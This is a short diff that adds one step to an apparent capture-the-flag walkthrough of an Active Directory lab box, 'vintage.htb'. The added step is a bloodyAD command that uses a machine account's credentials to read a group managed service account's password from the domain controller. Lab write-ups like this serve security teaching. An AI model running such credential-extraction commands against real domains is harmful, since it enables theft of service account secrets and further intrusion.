@@ -84,5 +84,8 @@
 
 11. FS01$ is part of the Domain Computers group, which has ReadGMSAPassword permission on account GMSA01$. We retrieve the GMSA password using bloodyAD
 
+`bloodyAD -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -u 'FS01$' -p 'fs01' -d vintage.htb get object 'gMSA01$' --attr msDS-ManagedPassword`
+
+
 
 
